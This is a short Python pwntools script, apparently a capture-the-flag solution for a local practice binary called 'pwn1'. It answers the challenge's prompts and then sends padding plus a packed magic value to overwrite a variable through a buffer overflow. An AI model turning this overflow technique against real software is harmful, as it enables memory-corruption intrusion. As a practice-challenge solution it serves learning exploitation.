from pwn import *

padding = b"0"*0x2b
secret = p32(0xdea110c8)

payload = b""
payload += padding
payload += secret

p = process('./pwn1')

p.readuntil(b"What... is your name?")
p.sendline(b"Sir Lancelot of Camelot")

p.readuntil(b"hat... is your quest?")
p.sendline(b"To seek the Holy Grail.")

p.readuntil(b"What... is my secret?")
p.send(payload)
p.readline()
p.interactive()
